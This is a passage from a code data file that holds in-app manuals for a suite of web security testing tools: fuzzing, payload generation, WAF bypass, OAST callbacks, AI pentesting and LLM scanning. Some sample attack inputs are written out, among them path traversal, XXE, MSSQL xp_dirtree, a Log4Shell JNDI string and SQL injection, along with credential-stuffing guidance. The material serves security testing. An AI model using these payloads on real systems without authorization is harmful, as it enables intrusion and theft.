━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. INTERESTING FINDINGS

Look for:
  .git/          — exposed version control repository
  .env           — environment variables (API keys, DB passwords)
  backup.zip     — unprotected backup archives
  admin/         — administrative interfaces
  api/           — undocumented API endpoints
  config.php.bak — source code backups

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "intruder-manual",
    title: "Intruder",
    subtitle: "Automated HTTP Fuzzing & Brute-Force Engine",
    tier: "pro",
    pages: 5,
    icon: Shield,
    version: "1.0",
    iconColor: "text-blue-400",
    content: `INTRUDER — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

Intruder automates HTTP request fuzzing with configurable payload
positions and wordlists. Inspired by Burp Suite's Intruder, it
supports Sniper, Battering Ram, Pitchfork, and Cluster Bomb attack types.

Navigate to: Command Center → Intruder (/intruder)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. ATTACK TYPES

Sniper (single position):
  One payload list. Fuzzes one marked position at a time.
  Use for: username brute-force, single-parameter testing

Battering Ram (all positions same payload):
  One payload list inserted into all marked positions simultaneously.
  Use for: username=password brute-force

Pitchfork (parallel lists):
  Multiple payload lists, one per position, iterated in lockstep.
  Use for: credential stuffing (user:pass pairs from a breach list)

Cluster Bomb (cartesian product):
  Multiple payload lists — tries every combination.
  Use for: exhaustive parameter combination testing

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. MARKING POSITIONS

  1. Paste the raw HTTP request in the editor
  2. Select a value to fuzz (e.g. a parameter value)
  3. Click "Mark" to add §§ delimiters: username=§admin§
  4. Add a payload list for each marked position

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. PAYLOAD TYPES

  Simple list  — newline-separated wordlist
  Numbers      — sequential or random integer range
  Dates        — date format patterns
  Custom       — paste any list

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. RESULTS

Results table shows each request:
  Payload, Status code, Response length, Response time
  Flag anomalies: different length from baseline = interesting

Grep match: highlight responses containing specific strings (e.g. "Invalid username" vs "Invalid password" to enumerate valid usernames)

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "payload-gen-manual",
    title: "Payload Generator",
    subtitle: "XSS, SQLi, LFI, SSRF & Command Injection Payloads",
    tier: "pro",
    pages: 4,
    icon: Code,
    version: "1.0",
    iconColor: "text-blue-400",
    content: `PAYLOAD GENERATOR — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

Payload Generator creates categorized attack payloads for security
testing. Use with Intruder, HTTP Probe, or any other testing tool.

Navigate to: Command Center → Payload Generator (/payloads)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. PAYLOAD CATEGORIES

XSS (Cross-Site Scripting):
  Basic, attribute-context, event-handler, DOM-based, filter-bypass,
  polyglot payloads. Includes encoding variants (HTML entity, URL, Unicode).

SQL Injection:
  Error-based, blind boolean, time-based blind, UNION-based, OOB.
  MySQL, PostgreSQL, MSSQL, Oracle, SQLite dialects.

Local File Inclusion (LFI):
  Path traversal (../../../etc/passwd), null-byte bypass,
  PHP wrapper (php://filter/), log poisoning setup payloads.

SSRF (Server-Side Request Forgery):
  Internal network probes (127.0.0.1, 169.254.x.x, 10.x.x.x),
  cloud metadata endpoints (AWS, GCP, Azure), protocol variants.

Command Injection:
  Semicolon, pipe, backtick, $() syntax for Linux and Windows.
  URL-encoded and double-encoded variants.

SSTI (Server-Side Template Injection):
  Jinja2, Twig, Freemarker, Pebble, Velocity detection payloads.

Open Redirect:
  Protocol-relative, whitelist bypass, parameter pollution payloads.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. ENCODING OPTIONS

Apply encoding to any payload before copy:
  URL encode · Double URL encode · HTML entities · Base64 · Unicode escape

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "cve-lookup-manual",
    title: "CVE Lookup",
    subtitle: "Live CVE Database Search & Vulnerability Intelligence",
    tier: "pro",
    pages: 3,
    icon: Shield,
    version: "1.0",
    iconColor: "text-blue-400",
    content: `CVE LOOKUP — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

CVE Lookup queries the NVD (National Vulnerability Database) and
multiple threat intelligence feeds in real-time to provide complete
vulnerability intelligence for any CVE identifier or product.

Navigate to: Command Center → CVE Lookup (/cve-search)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. SEARCH MODES

By CVE ID:
  Enter CVE-YYYY-NNNNN → full NVD record, CVSS score, affected versions,
  references, patch status, PoC availability

By Product:
  Enter software/vendor name → all known CVEs sorted by CVSS score

By Keyword:
  Free-text search across CVE descriptions

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. RESULT FIELDS

  CVE ID, CWE, CVSS Base Score (v3.1), CVSS Vector
  Severity: Critical / High / Medium / Low / None
  Affected CPE configurations (exact product + version ranges)
  References (NVD, vendor advisory, PoC repos)
  EPSS score (Exploit Prediction Scoring System — probability of exploitation)
  Known exploited: in CISA KEV catalog (yes/no + deadline)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. BUG BOUNTY USE

Look up CVEs for technologies you identified during recon to find:
  • Unpatched versions of known-vulnerable software
  • PoC exploit code for vulnerabilities
  • Affected version ranges to compare against target fingerprint

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "encoder-decoder-manual",
    title: "Encoder / Decoder",
    subtitle: "Multi-Format Encoding, Decoding & Hashing",
    tier: "pro",
    pages: 3,
    icon: Code,
    version: "1.0",
    iconColor: "text-blue-400",
    content: `ENCODER / DECODER — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

The Encoder/Decoder handles all common encoding and hashing schemes
used in web application security testing.

Navigate to: Command Center → Encoder / Decoder (/encoder)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. ENCODING TYPES

  URL encode / decode        (percent-encoding)
  Double URL encode          (bypass WAF filters)
  HTML entity encode/decode  (&amp; &#x3C; etc.)
  Base64 encode/decode       (standard + URL-safe variants)
  Base32 encode/decode
  Hex encode/decode
  Unicode escape (\\uXXXX)
  Binary representation
  Punycode (IDN domain encoding)
  JWT decode (payload inspection, no signature verification)
  gzip compress/decompress (base64-wrapped)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. HASHING

  MD5 · SHA-1 · SHA-256 · SHA-512 · SHA3-256 · SHA3-512
  HMAC-SHA256 (with key)
  bcrypt verify (compare plaintext against hash)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. SMART DECODE

Paste any string — the Smart Decode function automatically detects
and decodes multiple encoding layers (e.g. URL → Base64 → HTML entity).
Useful for decoding obfuscated malware URLs or WAF bypass payloads.

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "api-tester-manual",
    title: "API Security Tester",
    subtitle: "REST & GraphQL Security Assessment",
    tier: "pro",
    pages: 5,
    icon: Database,
    version: "1.0",
    iconColor: "text-cyan-400",
    content: `API SECURITY TESTER — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

API Security Tester is purpose-built for REST and GraphQL API security
assessment, going beyond general HTTP testing to automate API-specific
vulnerability checks from the OWASP API Security Top 10.

Navigate to: Command Center → API Security Tester (/api-tester)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. OWASP API TOP 10 CHECKS

API1: Broken Object Level Authorization (BOLA/IDOR)
  Systematically replaces object IDs with sequential/random values.

API2: Broken Authentication
  Tests JWT alg:none, weak secrets, missing expiry checks.

API3: Broken Object Property Level Authorization
  Tests for mass assignment — sends extra properties to PATCH/PUT.

API4: Unrestricted Resource Consumption
  Sends very large payloads, deeply nested JSON, large page sizes.

API5: Broken Function Level Authorization
  Tests admin endpoints with unprivileged tokens.

API6: Unrestricted Access to Sensitive Business Flows
  Tests for rate limiting on critical workflows (login, checkout).

API7: SSRF — Server-Side Request Forgery via API parameters.

API8: Security Misconfiguration
  Checks CORS, verbose error messages, debug endpoints.

API9: Improper Inventory Management
  Tests non-production endpoints (/v1, /dev, /internal).

API10: Unsafe Consumption of APIs
  Tests for injection via third-party API response handling.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. GRAPHQL TESTING

  Introspection: GET /graphql?query={__schema{types{name}}}
  Field suggestion bypass
  Query depth/complexity bomb testing
  Batch query abuse
  Alias-based rate limit bypass

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. USAGE

  1. Enter the API base URL
  2. Import OpenAPI/Swagger spec (optional, auto-discovers endpoints)
  3. Set authentication (Bearer token, API key, Basic auth, Cookie)
  4. Select checks to run
  5. Review findings report with severity ratings and remediation steps

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "oast-manual",
    title: "OAST Blind Tester & Callback Server",
    subtitle: "Out-of-Band Application Security Testing",
    tier: "pro",
    pages: 5,
    icon: Eye,
    version: "1.0",
    iconColor: "text-violet-400",
    content: `OAST BLIND TESTER & CALLBACK SERVER — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

OAST (Out-of-Band Application Security Testing) detects blind
vulnerabilities that don't produce visible output in HTTP responses.
ProxhqVPN runs an OAST callback server that logs DNS, HTTP, and
SMTP interactions triggered by payloads you inject.

Navigate to: Command Center → OAST Blind Tester (/oast-tester)
            Command Center → OAST Callback Server (/oast-server)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. HOW OAST WORKS

  1. You generate a unique OAST payload (DNS or URL-based)
  2. You inject it into a target parameter
  3. If the server processes your payload (e.g. resolves DNS, fetches URL),
     the ProxhqVPN OAST callback server receives and logs the interaction
  4. You see the interaction in the OAST Server dashboard

This detects:
  Blind SSRF — server fetches your OAST URL
  Blind XXE — XML parser fetches your OAST URL or DNS
  Blind SQL injection — xp_dirtree UNC path triggers DNS lookup
  Blind OS command injection — curl/wget fetches your OAST URL
  Log4Shell — JNDI lookup triggers DNS to your OAST domain

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. GENERATING PAYLOADS

  1. OAST Blind Tester → "Generate New Payload"
  2. Select type: DNS / HTTP / HTTPS / DNS+HTTP / SMTP
  3. Copy the unique payload URL or domain
  4. Inject into your target:
       HTTP parameter: url=http://your-oast-id.oast.proxhqvpn.com
       XML (XXE): <!ENTITY x SYSTEM "http://your-oast-id.oast...">
       SQL (MSSQL): EXEC xp_dirtree '//your-oast-id.oast.../share'
       Log4j: \${jndi:dns://your-oast-id.oast.proxhqvpn.com/a}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. CALLBACK SERVER DASHBOARD

The OAST Server (/oast-server) shows all received interactions:
  Timestamp, interaction type (DNS/HTTP), source IP, payload matched,
  full DNS query or HTTP request (method, headers, body)

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "waf-bypass-manual",
    title: "WAF Bypass Generator",
    subtitle: "Automated WAF Evasion Payload Crafting",
    tier: "pro",
    pages: 4,
    version: "1.0",
    icon: Shield,
    iconColor: "text-red-400",
    content: `WAF BYPASS GENERATOR — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

WAF Bypass Generator takes a known attack payload and automatically
generates dozens of evasion variants that bypass common WAF rule sets
(ModSecurity, Cloudflare WAF, AWS WAF, Imperva, Akamai, F5 AWAF).

Navigate to: Command Center → WAF Bypass Generator (/waf-bypass)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. BYPASS TECHNIQUES

Encoding bypasses:
  URL double-encode · HTML entity · Unicode normalization
  UTF-8 overlong sequences · Null-byte injection · Case variation

Syntax bypasses (SQL):
  Comment injection (/**/, --+, #, /*!50000*/
  Scientific notation (1e0 = 1), hexadecimal values
  Alternative operators (||, &&, AND, OR equivalents)

Syntax bypasses (XSS):
  Tag variation (<ScRiPt>, <svg>, <img onerror=...>)
  Event handler variation, javascript: protocol variants
  CSS injection via expression()

WAF fingerprinting:
  Send known WAF challenge strings to identify the WAF in use
  Then select the WAF-specific bypass template

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. USAGE

  1. Enter your base payload (e.g. ' OR 1=1--)
  2. Select attack type (SQLi / XSS / CMD)
  3. Select target WAF (or "Auto-detect")
  4. Click "Generate Bypasses"
  5. Copy variants to Intruder or HTTP Probe for testing

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "ws-tester-manual",
    title: "WebSocket Security Tester",
    subtitle: "WebSocket Fuzzing, Interception & Security Analysis",
    tier: "pro",
    pages: 4,
    icon: Network,
    version: "1.0",
    iconColor: "text-blue-400",
    content: `WEBSOCKET SECURITY TESTER — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

WebSocket Tester connects to any WebSocket endpoint, logs all frames,
and lets you send arbitrary messages for security analysis including
injection testing, authentication bypass, and DoS assessment.

Navigate to: Command Center → WebSocket Tester (/ws-tester)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. CONNECTING

  1. Enter WebSocket URL: ws:// or wss://
  2. Optional: add HTTP upgrade headers (Origin, Cookie, Authorization)
  3. Click Connect
  4. Connection state and handshake headers are displayed

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. SECURITY TESTS

Cross-Site WebSocket Hijacking:
  Connect with a forged Origin header
  If accepted: CSWSH vulnerability (no origin validation)

Authentication bypass:
  Connect without the expected auth token
  Connect with an expired token
  Connect with another user's token (IDOR test)

Message injection:
  Send SQLi / XSS / SSTI payloads as WebSocket messages
  Watch for errors revealing server-side template or DB technology

DoS assessment:
  Send very large frames (frame size abuse)
  Send high-frequency messages (rate limit test)
  Send malformed JSON or unexpected data types

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. FRAME LOG

All sent and received frames are logged with:
  Direction (↑ sent / ↓ received), timestamp, frame type (text/binary), payload

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "sast-manual",
    title: "SAST Analyzer",
    subtitle: "Static Application Security Testing",
    tier: "pro",
    pages: 4,
    icon: Search,
    version: "1.0",
    iconColor: "text-yellow-400",
    content: `SAST ANALYZER — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

SAST (Static Application Security Testing) analyzes source code
without executing it, identifying security vulnerabilities by pattern
matching, taint analysis, and control-flow examination.

Navigate to: Command Center → SAST Analyzer (/sast)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. SUPPORTED LANGUAGES

  JavaScript / TypeScript · Python · PHP · Java · C# (.NET)
  Go · Ruby · Rust · Kotlin · Swift · Bash / Shell

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. VULNERABILITY CATEGORIES DETECTED

  SQL Injection (taint: user input → database query)
  Command Injection (taint: user input → exec/shell)
  Path Traversal (taint: user input → file path)
  XSS (taint: user input → HTML output without escaping)
  Hardcoded credentials / secrets / API keys
  Insecure crypto (MD5, SHA1, DES, ECB mode)
  Dangerous functions (eval, exec, unserialize)
  Insecure deserialization
  XXE — disabled entity processing
  Open redirect
  CSRF — missing token validation
  Missing authentication checks on sensitive functions

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. USAGE

  1. Paste code or upload a file (max 500KB)
  2. Select language (or auto-detect)
  3. Click "Analyze"
  4. Results show: file, line number, severity, description, remediation

CodeSentinel (AI-powered) provides auto-fix suggestions for each
finding — see the CodeSentinel manual for details.

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "dep-scanner-manual",
    title: "Dependency Scanner",
    subtitle: "SCA — Software Composition Analysis",
    tier: "pro",
    pages: 4,
    icon: FileText,
    version: "1.0",
    iconColor: "text-amber-400",
    content: `DEPENDENCY SCANNER — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

Dependency Scanner performs SCA (Software Composition Analysis) —
identifying known vulnerabilities in third-party libraries and
packages used by your application.

Navigate to: Command Center → Dependency Scanner (/dep-scanner)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. SUPPORTED MANIFESTS

  Node.js:  package.json, package-lock.json, yarn.lock, pnpm-lock.yaml
  Python:   requirements.txt, Pipfile, pyproject.toml, poetry.lock
  Java:     pom.xml, build.gradle
  .NET:     *.csproj, packages.config, NuGet.Config
  Ruby:     Gemfile, Gemfile.lock
  PHP:      composer.json, composer.lock
  Go:       go.mod, go.sum
  Rust:     Cargo.toml, Cargo.lock

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. VULNERABILITY SOURCES

Findings are cross-referenced against:
  NVD (National Vulnerability Database) CVEs
  GitHub Advisory Database
  OSV (Open Source Vulnerabilities)
  Snyk Vulnerability DB
  npm audit, pip-audit equivalent checks

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. RESULTS

For each vulnerable dependency:
  Package name + installed version
  CVE ID(s), CVSS score, severity
  Fix version (upgrade to X.X.X to remediate)
  Direct vs transitive dependency indicator
  License risk flag (GPL in commercial project, etc.)

Export results as JSON, CSV, or SARIF for integration with CI/CD.

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── Command Center — AI Security Suite ────────────────────────────────────
  {
    id: "ghost-pentest-manual",
    title: "GhostPentest — AI Pentest Engine",
    subtitle: "Autonomous AI-Directed Penetration Testing",
    tier: "pro",
    pages: 5,
    icon: Shield,
    version: "1.0",
    iconColor: "text-blue-400",
    content: `GHOSTPENTEST — AI PENTEST ENGINE — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

GhostPentest is an autonomous AI-directed penetration testing engine.
It conducts multi-stage reconnaissance, fingerprinting, vulnerability
discovery, and exploitation attempts — all guided by an AI planner
that adapts its strategy based on intermediate findings.

Navigate to: Command Center → GhostPentest (/ghost-pentest)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. TESTING STAGES

Stage 1 — Surface Discovery:
  Subdomain enumeration (9-source passive), port scanning, banner grabbing

Stage 2 — Technology Fingerprinting:
  Web framework, CMS, server, CDN, WAF detection
  JavaScript library versions, API endpoints

Stage 3 — Vulnerability Assessment:
  CVE mapping against fingerprinted versions
  OWASP Top 10 automated checks
  Authentication flow analysis

Stage 4 — Exploitation Attempts (with permission only):
  Safe exploitation of confirmed vulnerabilities
  Proof-of-concept extraction (e.g. reading /etc/passwd via LFI)
  Authentication bypass confirmation

Stage 5 — Impact Assessment:
  CVSS score assignment
  Business impact narrative
  Complete pentest report generation

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. USAGE

  1. Enter target scope (domain, IP range, or specific URLs)
  2. Select test depth: Recon Only / Assessment / Full Pentest
  3. Confirm scope agreement (only test systems you own or have permission)
  4. Click "Launch GhostPentest"
  5. Monitor live findings as stages complete

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. REPORTS

PDF and JSON reports generated automatically:
  Executive summary, technical findings, evidence screenshots,
  CVSS scores, remediation steps, re-test checklist

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "soc-copilot-manual",
    title: "SOC Copilot — AI Security Operations",
    subtitle: "AI-Assisted Alert Triage & Incident Response",
    tier: "pro",
    pages: 4,
    icon: Terminal,
    version: "1.0",
    iconColor: "text-blue-400",
    content: `SOC COPILOT — AI SECURITY OPERATIONS — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

SOC Copilot is an AI assistant trained on security operations workflows.
It helps analysts triage alerts, investigate incidents, query the
Security Event Log (SIEM), and draft incident response playbooks.

Navigate to: Command Center → SOC Copilot (/soc-copilot)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. CAPABILITIES

Alert Triage:
  Paste any SIEM alert → SOC Copilot explains what it means,
  rates its severity, and recommends investigation steps.

IOC Enrichment:
  Submit an IP, domain, hash, or URL → Copilot queries threat
  intelligence feeds and summarizes the reputation, associated
  malware families, and recommended response.

Log Analysis:
  Paste firewall, proxy, or syslog entries → Copilot identifies
  anomalous patterns, attack indicators, and timeline reconstruction.

Playbook Generation:
  Describe an incident type → Copilot generates a complete
  step-by-step IR playbook (containment, eradication, recovery).

Custom Queries:
  Ask any security operations question in natural language:
  "What Firewall rules would protect against this attack?"
  "How do I configure fail2ban for this log format?"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. INTEGRATION WITH PROXHQVPN

SOC Copilot has direct read access to:
  • Security Event Log (SIEM) — query across all event sources
  • Firewall Analytics — threat level, blocked IPs, rule matches
  • Ghost Trace observations
  • Beacon Monitor alerts

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "code-sentinel-manual",
    title: "CodeSentinel — AI SAST & Autofix",
    subtitle: "AI-Powered Code Security Analysis with Automatic Fixes",
    tier: "pro",
    pages: 4,
    icon: Code,
    version: "1.0",
    iconColor: "text-blue-400",
    content: `CODESENTINEL — AI SAST & AUTOFIX — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

CodeSentinel combines traditional SAST pattern matching with an
AI model that understands code semantics. Unlike rule-based scanners,
it can detect novel vulnerabilities through reasoning, and it
generates verified fixes for every finding.

Navigate to: Command Center → CodeSentinel (/code-sentinel)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. AI ADVANTAGE OVER TRADITIONAL SAST

Traditional SAST:
  Pattern matching against known vulnerable code patterns.
  High false-positive rate. Cannot understand context.

CodeSentinel AI:
  Understands data flow, control flow, and developer intent.
  Reduces false positives by 70%+ vs pattern matching.
  Detects zero-day patterns through semantic reasoning.
  Explains WHY code is vulnerable in plain language.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. AUTOFIX

For every finding, CodeSentinel generates:
  • A corrected version of the vulnerable function
  • An explanation of what changed and why
  • Unit tests that verify the fix

Autofix supports all 12 languages in the SAST Analyzer.
Fixes are reviewed-before-apply — never automatically committed.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. CI/CD INTEGRATION

CodeSentinel can be triggered via API for CI pipeline integration:
  POST /api/code-sentinel/analyze
  Body: {code, language, autofix: true/false}
  Returns: {findings[], fixedCode, summary}

Use the SARIF output format for integration with GitHub Advanced Security.

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "llm-probe-manual",
    title: "LLMProbe — LLM Vulnerability Scanner",
    subtitle: "Prompt Injection, Jailbreak & LLM Security Testing",
    tier: "pro",
    pages: 4,
    icon: Cpu,
    version: "1.0",
    iconColor: "text-cyan-400",
    content: `LLMPROBE — LLM VULNERABILITY SCANNER — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

LLMProbe tests AI/LLM-powered applications for the OWASP Top 10
for LLMs — vulnerabilities unique to systems using language models.

Navigate to: Command Center → LLMProbe (/llm-probe)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. OWASP LLM TOP 10 CHECKS

LLM01: Prompt Injection
  Direct injection (user input modifies system prompt behavior)
  Indirect injection (malicious content in retrieved context)

LLM02: Insecure Output Handling
  Test if LLM output reaches HTML/SQL/shell without sanitization

LLM03: Training Data Poisoning (assessment only — detect symptoms)

LLM04: Model Denial of Service
  Extremely long prompts, recursive references, billion-laughs style

LLM05: Supply Chain Vulnerabilities (model provenance checks)

LLM06: Sensitive Information Disclosure
  Attempt to extract training data, system prompts, other users' data

LLM07: Insecure Plugin Design
  Test plugins/tools the LLM can invoke for SSRF, command injection

LLM08: Excessive Agency
  Verify the LLM cannot take unintended actions beyond its scope

LLM09: Overreliance on LLM output in security-sensitive contexts

LLM10: Model Theft — probe for model extraction via API queries

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. USAGE

  1. Enter the LLM API endpoint or paste the chatbot URL
  2. Configure API key/auth for the target system
  3. Select checks to run
  4. Review findings — each shows the payload used and the response evidence

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "ai-shield-manual",
    title: "AIShield — LLM Security Firewall",
    subtitle: "Prompt Injection Detection & LLM Traffic Filtering",
    tier: "pro",
    pages: 4,
    icon: Shield,
    version: "1.0",
    iconColor: "text-blue-400",
    content: `AISHIELD — LLM SECURITY FIREWALL — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

AIShield is a reverse proxy firewall for LLM applications. It sits
between users and your AI model, intercepting and filtering prompts
for injection attacks, sensitive data, and policy violations — before
they reach the model.

Navigate to: Command Center → AIShield (/ai-shield)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. DETECTION CAPABILITIES

Prompt Injection Detection:
  Classifies prompts as benign or injection attempt using a dedicated
  classifier model. Confidence score shown with each decision.

Jailbreak Detection:
  Detects DAN prompts, roleplay-based jailbreaks, many-shot jailbreaks,
  and token manipulation techniques.

PII Filtering:
  Detects and masks: email addresses, phone numbers, SSNs, credit card
  numbers, IP addresses in both prompts and responses.

Toxic Content:
  Blocks prompts and responses containing hate speech, violence,
  self-harm content — configurable per policy.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. INTEGRATION

  1. Point your application's LLM calls to AIShield proxy endpoint
  2. AIShield forwards clean prompts to the actual LLM (OpenAI, Anthropic, etc.)
  3. Responses are also filtered before returning to the application

API: POST /api/ai-shield/analyze · POST /api/ai-shield/proxy · GET /api/ai-shield/logs

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. DASHBOARD

Real-time stats:
  Prompts inspected, blocked, passed
  Block reason distribution (injection, jailbreak, PII, toxic)
  Top flagged patterns

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "request-mind-manual",
    title: "RequestMind — AI HTTP Scanner",
    subtitle: "AI-Assisted HTTP Traffic Analysis & Vulnerability Detection",
    tier: "pro",
    pages: 4,
    icon: Globe,
    version: "1.0",
    iconColor: "text-green-400",
    content: `REQUESTMIND — AI HTTP SCANNER — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

RequestMind uses AI to analyze HTTP request/response pairs for
security issues — going beyond header checklists to understand
application logic vulnerabilities that rule-based scanners miss.

Navigate to: Command Center → RequestMind (/request-mind)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. INPUT MODES

Manual Paste:
  Paste raw HTTP request + response → AI analyzes immediately

Capture Mode:
  Configure your browser to proxy through RequestMind.
  All requests are captured and analyzed in real-time as you browse.

Bulk Import:
  Import HAR (HTTP Archive) files from browser DevTools for batch analysis.

